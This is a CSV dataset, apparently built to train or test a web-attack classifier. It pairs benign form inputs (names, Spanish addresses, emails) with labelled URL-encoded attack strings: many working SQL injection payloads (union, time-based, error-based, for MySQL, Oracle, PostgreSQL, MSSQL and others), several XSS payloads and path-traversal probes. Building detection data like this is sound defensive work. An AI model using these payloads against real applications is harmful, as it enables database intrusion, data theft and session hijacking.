payload,payload_len,alpha,non_alpha,attack_feature,label
1.92418E+15,16,68.75,31.25,45.45454545454545,0
calle%20castaos%2090,16,100.0,0.0,0.0,0
producti8,9,100.0,0.0,0.0,0
opinable,8,100.0,0.0,0.0,0
2.02612E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29%20and%20%28%22ponv%22%3D%22ponv,222,83.33333333333334,16.666666666666664,270000.0,1
02703849s,9,100.0,0.0,0.0,0
-2866%27%29%29%20or%204491%3D9429%23,22,72.72727272727273,27.27272727272727,30000.0,1
inconstitucional,16,100.0,0.0,0.0,0
1%22%29%20as%20axua%20where%206718%3D6718%3Bif%288264%3D1939%29%20select%208264%20else%20drop%20function%20nsoq--,79,88.60759493670885,11.39240506329114,90000.0,1
rubi%20de%20biasi,13,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27ctgs%27%20where%206809%3D6809%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,96,77.08333333333334,22.916666666666664,69000.0,1
teddie,6,100.0,0.0,0.0,0
kareem,6,100.0,0.0,0.0,0
9.30495E+15,16,68.75,31.25,45.45454545454545,0
1%25%22%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%22%25%22%3D%22,103,77.66990291262135,22.330097087378643,30000.0,1
torrescrcela,12,100.0,0.0,0.0,0
1%27%29%29%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%28%27nlky%27%20like%20%27nlky,170,71.17647058823529,28.823529411764703,90000.0,1
calle%20300%20al%208%20del%20km.%201%20puesta%20en%20riego%20144%2C,45,100.0,0.0,0.0,0
hanlon%40importaproductosespaoles.cs,34,100.0,0.0,0.0,0
-1%3Ccrosssitescripting%20style%3D%22crosssitescripting%3Aexpression%28document.cookie%3Dtrue%29%22%3E,82,86.58536585365853,13.414634146341465,60000.0,1
orejana,7,100.0,0.0,0.0,0
1%22%29%29%20as%20yiaw%20where%202841%3D2841%20or%20sleep%285%29--,42,80.95238095238095,19.047619047619047,60000.0,1
25793872q,9,100.0,0.0,0.0,0
41457,5,100.0,0.0,0.0,0
1%27%20where%201017%3D1017%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29--,223,73.09417040358744,26.905829596412556,90000.0,1
derch%20mallol,12,100.0,0.0,0.0,0
fernald,7,100.0,0.0,0.0,0
1%27%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%27osqf%27%3D%27osqf,109,87.1559633027523,12.844036697247708,60000.0,1
1%27%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%27gpeo%27%20like%20%27gpeo,110,84.54545454545455,15.454545454545453,90000.0,1
1%25%22%29%29%29%20and%207758%3D4792%20and%20%28%28%28%22%25%22%3D%22,33,57.57575757575758,42.42424242424242,60000.0,1
16240,5,100.0,0.0,0.0,0
emad,4,100.0,0.0,0.0,0
seddon%407peines.es,17,100.0,0.0,0.0,0
45256,5,100.0,0.0,0.0,0
c/%20olid%20176%2C,12,100.0,0.0,0.0,0
-2625%27%29%29%20or%203038%3D3038,21,76.19047619047619,23.809523809523807,30000.0,1
desplacib-le,12,100.0,0.0,0.0,0
1%29%29%20as%20xutu%20where%205811%3D5811%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,165,73.33333333333333,26.666666666666668,60000.0,1
sintes%20novoa,12,100.0,0.0,0.0,0
bau%20pelayo,10,100.0,0.0,0.0,0
1%20where%206040%3D6040%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,116,84.48275862068965,15.517241379310345,90000.0,1
-5606%29%20union%20all%20select%207118%2C7118%2C7118%2C7118%2C7118%2C7118%2C7118%2C7118%2C7118%23,69,84.05797101449275,15.942028985507244,60000.0,1
tapioles,8,100.0,0.0,0.0,0
-6075%27%20union%20all%20select%209988%2C9988%2C9988%2C9988%2C9988%2C9988%2C9988%2C9988%2C9988%23,69,84.05797101449275,15.942028985507244,60000.0,1
1%27%29%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%27ijyi%27%3D%27ijyi,124,83.87096774193549,16.129032258064516,90000.0,1
1%22%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,27,66.66666666666666,33.33333333333333,30000.0,1
genciano,8,100.0,0.0,0.0,0
1%29%29%29%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%20and%20%28%28%281321%3D1321,69,78.26086956521739,21.73913043478261,60000.0,1
2.23791E+15,16,68.75,31.25,45.45454545454545,0
em8o0a2,7,100.0,0.0,0.0,0
1.71456E+15,16,68.75,31.25,45.45454545454545,0
-5657%27%29%29%29%20union%20all%20select%208071%2C8071%2C8071%2C8071%2C8071%2C8071%2C8071%2C8071%23,67,80.59701492537313,19.402985074626866,60000.0,1
valleseco,9,100.0,0.0,0.0,0
1%25%22%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,89,84.26966292134831,15.730337078651685,30000.0,1
recur23bl6,10,100.0,0.0,0.0,0
bayarri%20bach,12,100.0,0.0,0.0,0
1%22%29%29%20as%20jikg%20where%208258%3D8258%20and%20%283973%3D1047%29%2A1047--,51,80.3921568627451,19.607843137254903,60000.0,1
16812,5,100.0,0.0,0.0,0
1%25%27%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,98,84.6938775510204,15.306122448979592,60000.0,1
04ega9i2a,9,100.0,0.0,0.0,0
potts,5,100.0,0.0,0.0,0
8i273e,6,100.0,0.0,0.0,0
-8209%29%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,137,83.94160583941606,16.05839416058394,30000.0,1
web-inf/web.xml,15,100.0,0.0,0.0,1
burrud-gyoengyoessy%40carloshoya.com.pr,37,100.0,0.0,0.0,0
1%22%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%28%22yobb%22%20like%20%22yobb,121,85.9504132231405,14.049586776859504,90000.0,1
50422961s,9,100.0,0.0,0.0,0
plza.%20maimonides%20197,20,100.0,0.0,0.0,0
imperial%20143,12,100.0,0.0,0.0,0
sedran,6,100.0,0.0,0.0,0
4.26048E+15,16,68.75,31.25,45.45454545454545,0
/.//./%7Bfile%7D,12,83.33333333333334,16.666666666666657,19.999999999999986,1
-1844%27%29%20union%20all%20select%209572%2C9572%2C9572%2C9572%23,45,84.44444444444444,15.555555555555555,60000.0,1
-8266%25%27%29%20union%20all%20select%208626%2C8626%2C8626%2C8626%2C8626%2C8626--,57,80.7017543859649,19.298245614035086,60000.0,1
es3regamiento,13,100.0,0.0,0.0,0
43790,5,100.0,0.0,0.0,0
finney,6,100.0,0.0,0.0,0
-1917%22%29%20or%208571%3D8571--,22,72.72727272727273,27.27272727272727,30000.0,1
1%2C%28select%20%28case%20when%20%287711%3D7711%29%20then%201%20else%207711%2A%28select%207711%20from%20information_schema.character_sets%29%20end%29%29,108,87.03703703703704,12.962962962962962,30000.0,1
dao,3,100.0,0.0,0.0,0
-7710%27%20where%205658%3D5658%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%2811,210,53.80952380952381,19.047619047619047,60000.0,1
1%27%2B%28select%20%27ples%27%20where%204244%3D4244%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%29%2B%27,166,83.73493975903614,16.265060240963855,30000.0,1
1%29%29%20as%20xlww%20where%205844%3D5844%3Bselect%20%28case%20when%20%283855%3D3855%29%20then%203855%20else%201/%28select%200%29%20end%29--,92,84.78260869565217,15.217391304347828,30000.0,1
aquiles,7,100.0,0.0,0.0,0
joan%20pelliser,13,100.0,0.0,0.0,0
1%29%29%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%288867%3D8867,158,72.15189873417721,27.848101265822784,60000.0,1
1%27%29%29%20as%20gchn%20where%205856%3D5856%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,122,86.0655737704918,13.934426229508196,60000.0,1
5498,4,100.0,0.0,0.0,0
gaviota%2013,10,100.0,0.0,0.0,0
-4768%27%7C%7C%28select%20%27dded%27%20from%20dual%20where%206499%3D6499%20union%20all%20select%206499--,72,86.11111111111111,13.88888888888889,120000.0,1
c/%20masia%20111%2010-g,17,100.0,0.0,0.0,0
yeste%20meloda,12,100.0,0.0,0.0,0
-4817%20union%20all%20select%207415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%23,68,85.29411764705883,14.705882352941178,60000.0,1
sol%20sieso,9,100.0,0.0,0.0,0
sant%20pau%20de%20segries,19,100.0,0.0,0.0,0
-9445%29%20as%20dmur%20where%204371%3D4371%20union%20all%20select%204371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%23,98,86.73469387755102,13.26530612244898,90000.0,1
pridiliano,10,100.0,0.0,0.0,0
7447,4,100.0,0.0,0.0,0
-2929%27%29%29%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%28%27nzmk%27%3D%27nzmk,122,78.68852459016394,21.311475409836063,90000.0,1
selles%20tanari,13,100.0,0.0,0.0,0
1%27%2B%28select%20%27uqaf%27%20where%207414%3D7414%3Biif%285257%3D5257%2C1%2C1/0%29,54,75.92592592592592,24.074074074074073,30000.0,1
-1015%22%29%29%20union%20all%20select%206624%2C6624%23,36,83.33333333333334,16.666666666666664,60000.0,1
-1830%22%29%29%20as%20bptv%20where%204805%3D4805%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3,265,43.77358490566038,15.471698113207546,69000.0,1
argamasilla%20de%20alba,19,100.0,0.0,0.0,0
-7293%27%29%29%29%20or%203038%3D3038,22,72.72727272727273,27.27272727272727,30000.0,1
collado%20villalba,16,100.0,0.0,0.0,0
prullans,8,100.0,0.0,0.0,0
miramon%40logiteclines.rs,23,100.0,0.0,0.0,0
8297,5,80.0,20.0,25.0,0
b4rl942r7,9,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%20sleep%285%29%23,20,60.0,40.0,30000.0,1
brittani,8,100.0,0.0,0.0,0
1%25%27%29%29%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%28%27%25%27%3D%27,109,73.39449541284404,26.605504587155966,60000.0,1
%27%27%3B%21--%22%3Cxss%3E%3D%26%7B%28%29%7D,18,38.88888888888889,61.11111111111111,157.1428571428571,1
ramblizo,8,100.0,0.0,0.0,0
1%25%27%29%29%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,101,83.16831683168317,16.831683168316832,60000.0,1
liew,4,100.0,0.0,0.0,0
nella,5,100.0,0.0,0.0,0
54430634f,9,100.0,0.0,0.0,0
vallespir%2C%20164%2C,15,100.0,0.0,0.0,0
conesa,6,100.0,0.0,0.0,0
1%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29,43,79.06976744186046,20.930232558139537,60000.0,1
9ara,4,100.0,0.0,0.0,0
carretera%20200%20hasta%20km.%201%20barra%20de%20mio%20175,42,100.0,0.0,0.0,0
bebedizo,8,100.0,0.0,0.0,0
1%22%20where%207380%3D7380%20or%209643%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,113,86.72566371681415,13.274336283185843,90000.0,1
27388,5,100.0,0.0,0.0,0
1%29%20where%209371%3D9371%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,72,86.11111111111111,13.88888888888889,90000.0,1
-1386%27%29%20or%20%287880%3D5362%29%2A5362%20and%20%28%27vsyu%27%20like%20%27vsyu,50,78.0,22.0,90000.0,1
terangue,8,100.0,0.0,0.0,0
verbosidad,10,100.0,0.0,0.0,0
20654328y,9,100.0,0.0,0.0,0
1%27%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29%20and%20%27foju%27%3D%27foju,251,71.71314741035857,28.286852589641438,129000.0,1
vendeja%2C%201%2C,11,100.0,0.0,0.0,0
bu7c2pi,7,100.0,0.0,0.0,0
porras%20roger,12,100.0,0.0,0.0,0
translaticio,12,100.0,0.0,0.0,0
1%27%29%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29,109,86.23853211009175,13.761467889908257,60000.0,1
-2323%22%29%20as%20zgsn%20where%209274%3D9274%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7,219,53.42465753424658,17.35159817351598,60000.0,1
magdi,5,100.0,0.0,0.0,0
basta,5,100.0,0.0,0.0,0
8,1,100.0,0.0,0.0,0
bardana,7,100.0,0.0,0.0,0
1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,56,83.92857142857143,16.071428571428573,60000.0,1
limpias,7,100.0,0.0,0.0,0
belia,5,100.0,0.0,0.0,0
1%27%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,63,74.60317460317461,25.396825396825395,9000.0,1
1%22%29%29%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%28%22kvpy%22%3D%22kvpy,126,76.19047619047619,23.015873015873016,90000.0,1
puntagorda,10,100.0,0.0,0.0,0
2095,4,100.0,0.0,0.0,0
jorge%20paquirachi,16,100.0,0.0,0.0,0
1%25%27%29%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%28%27%25%27%3D%27,200,71.0,28.999999999999996,60000.0,1
1.72128E+15,16,68.75,31.25,45.45454545454545,0
requena,7,100.0,0.0,0.0,0
gavald,6,100.0,0.0,0.0,0
michigan,8,100.0,0.0,0.0,0
1%22%29%29%20as%20tfjh%20where%201134%3D1134%20and%208635%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,89,82.02247191011236,17.97752808988764,90000.0,1
carraspeo,9,100.0,0.0,0.0,0
coslada%2083%2C%204g,14,100.0,0.0,0.0,0
-2823%27%29%29%20or%205663%3D4228%20and%20%28%28%27skgh%27%20like%20%27skgh,45,77.77777777777779,22.22222222222222,90000.0,1
16842,5,100.0,0.0,0.0,0
write%281%29%20autofocus%3E%3Cinput%20autofocus%3E,36,86.11111111111111,13.888888888888886,16.129032258064512,1
3407,4,100.0,0.0,0.0,0
7.1339E+15,16,62.5,37.5,60.0,0
1%27%29%29%29%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%28%28%28%27vtoi%27%20like%20%27vtoi,90,81.11111111111111,18.88888888888889,60000.0,1
-8625%20or%203176%3D2519%23%20fvgl,24,87.5,12.5,30000.0,1
-3867%25%27%29%20or%203084%3D5633%20and%20%28%27%25%27%3D%27,32,65.625,34.375,60000.0,1
s0308ga52r,10,100.0,0.0,0.0,0
ljund%40casadedurcal.sl,21,100.0,0.0,0.0,0
1%22%29%20where%205298%3D5298%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--,220,73.18181818181819,26.81818181818182,90000.0,1
1%27%29%29%20and%20char%28109%29%7C%7Cchar%2879%29%7C%7Cchar%2870%29%7C%7Cchar%2890%29%3Dregexp_substring%28repeat%28right%28char%285012%29%2C0%29%2C5000000000%29%2Cnull%29--,112,71.42857142857143,28.57142857142857,30000.0,1
-9462%22%29%20as%20vzga%20where%204799%3D4799%20or%208691%3D1048,44,88.63636363636364,11.363636363636363,60000.0,1
3916,4,100.0,0.0,0.0,0
1%27%20and%201661%3D1244%20and%20%27dcha%27%3D%27dcha,33,81.81818181818183,18.181818181818183,60000.0,1
%7Cnid,4,75.0,25.0,33.33333333333333,1
1%25%22%20and%20%282850%3D6610%29%2A6610%20and%20%22%25%22%3D%22,34,67.64705882352942,32.35294117647059,60000.0,1
-2296%22%20union%20all%20select%207359%2C7359%2C7359%2C7359%2C7359%2C7359%23,54,85.18518518518519,14.814814814814813,60000.0,1
retamal,7,100.0,0.0,0.0,0
1%25%27%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,37,78.37837837837837,21.621621621621628,27.586206896551737,1
regla%20casiano,13,100.0,0.0,0.0,0
1%27%20where%201031%3D1031%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29--,124,75.0,25.0,60000.0,1
1%22%29%29%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%28%22rvuz%22%20like%20%22rvuz,131,77.86259541984732,21.374045801526716,120000.0,1
mccaig,6,100.0,0.0,0.0,0
1%29%20where%205442%3D5442%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,135,84.44444444444444,15.555555555555555,90000.0,1
autoritariamente,16,100.0,0.0,0.0,0
tilden.auerbach4%40cochesautomaticos.ru,37,100.0,0.0,0.0,0
%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,26,76.92307692307693,23.076923076923066,29.999999999999982,1
#NAME?,9,0.0,100.0,100,0
14412,5,100.0,0.0,0.0,0
1%27%29%3Bwaitfor%20delay%20%270%3A0%3A5%27,25,72.0,28.000000000000004,30000.0,1
1%22%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29,44,86.36363636363636,13.63636363636364,15.789473684210531,1
clifford,8,100.0,0.0,0.0,0
08466616v,9,100.0,0.0,0.0,0
argerich%20tries,14,100.0,0.0,0.0,0
jeria%20cifr,10,100.0,0.0,0.0,0
calle%20la%20pernia%2C%204,18,100.0,0.0,0.0,0
1%25%27%29%20or%20elt%286272%3D6272%2Csleep%285%29%29%20and%20%28%27%25%27%3D%27,42,64.28571428571429,35.714285714285715,60000.0,1
1%27%29%29%29%3Bselect%20sleep%285%29%23,22,63.63636363636363,36.36363636363637,57.14285714285715,1
-1617%25%22%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bc,197,60.40609137055838,19.289340101522843,30000.0,1
2812,4,100.0,0.0,0.0,0
10898485g,9,100.0,0.0,0.0,0
47606,5,100.0,0.0,0.0,0
4.14869E+15,16,68.75,31.25,45.45454545454545,0
%28select%20%28case%20when%20%286986%3D6986%29%20then%206986%20else%206986%2A%28select%206986%20from%20mysql.db%29%20end%29%29,84,86.90476190476191,13.095238095238097,30000.0,1
2.77156E+15,16,68.75,31.25,45.45454545454545,0
1%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29--%20saxs,53,79.24528301886792,20.754716981132077,30000.0,1
sibirskaia%40euskalcasino.es,26,100.0,0.0,0.0,0
1%20where%206095%3D6095%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,78,83.33333333333334,16.666666666666664,90000.0,1
99631010r,9,100.0,0.0,0.0,0
6.35198E+15,16,68.75,31.25,45.45454545454545,0
alberite%20de%20san%20juan,20,100.0,0.0,0.0,0
1%27%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%27nbxw%27%3D%27nbxw,79,84.81012658227847,15.18987341772152,30000.0,1
1%27%29%29%20as%20plgq%20where%201121%3D1121%3Bselect%20pg_sleep%285%29--,49,79.59183673469387,20.408163265306122,30000.0,1
plaa%20de%20augusto%20miranda%2C%20193%2C,29,100.0,0.0,0.0,0
1%25%27%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,49,75.51020408163265,24.489795918367346,30000.0,1
8.74946E+15,16,68.75,31.25,45.45454545454545,0
1%27%7C%7C%28select%20%27rhcv%27%20where%206228%3D6228%3Bselect%20%28case%20when%20%283672%3D8360%29%20then%203672%20else%203672%2A%28select%203672%20from%20information_schema.character_sets%29%20end%29%23,143,86.01398601398601,13.986013986013987,60000.0,1
31414,5,100.0,0.0,0.0,0
50174,5,100.0,0.0,0.0,0
marcet%20bolivar,14,100.0,0.0,0.0,0
1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,41,85.36585365853658,14.634146341463413,60000.0,1
kubrick.blessed%40suardistec.ee,29,100.0,0.0,0.0,0
casserres,9,100.0,0.0,0.0,0
tablian2%40tequieroverde.az,25,100.0,0.0,0.0,0
1%27%2B%28select%20%27hcqf%27%20where%209956%3D9956%20and%20%282993%3D4297%29%2A4297%29%2B%27,57,77.19298245614034,22.807017543859647,60000.0,1
prussel%40mataluenga.co,21,100.0,0.0,0.0,0
23543482s,9,100.0,0.0,0.0,0
1%27%29%29%29%20or%20sleep%285%29%20and%20%28%28%28%27bmnf%27%20like%20%27bmnf,42,71.42857142857143,28.57142857142857,90000.0,1
1%27%2B%28select%20ntym%20where%204750%3D4750%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,81,90.12345679012346,9.876543209876543,30000.0,1
barlovento,10,100.0,0.0,0.0,0
50sc2e3i6i1172,14,100.0,0.0,0.0,0
blan2ueo,8,100.0,0.0,0.0,0
a79ga44,7,100.0,0.0,0.0,0
venialbo,8,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%28%22%25%22%3D%22,109,73.39449541284404,26.605504587155966,60000.0,1
jean-yve,8,100.0,0.0,0.0,0
obolensky%40etnics.hr,19,100.0,0.0,0.0,0
1%27%29%3Bselect%20%28case%20when%20%284719%3D8852%29%20then%201%20else%204719%2A%28select%204719%20from%20master..sysdatabases%29%20end%29--,97,84.5360824742268,15.463917525773196,30000.0,1
1%27%20where%208469%3D8469%3Bselect%20%28case%20when%20%284769%3D4769%29%20then%204769%20else%204769%2A%28select%204769%20from%20mysql.db%29%20end%29%23,102,87.25490196078431,12.745098039215685,60000.0,1
1%27%20where%205335%3D5335%3Bselect%20pg_sleep%285%29--,39,79.48717948717949,20.51282051282051,30000.0,1
palau%20tanquia,13,100.0,0.0,0.0,0
1%22%29%29%20as%20eqeb%20where%206784%3D6784%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29--,122,81.14754098360656,18.852459016393443,60000.0,1
1%25%27%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,141,69.50354609929079,30.49645390070922,30000.0,1
corrius,7,100.0,0.0,0.0,0
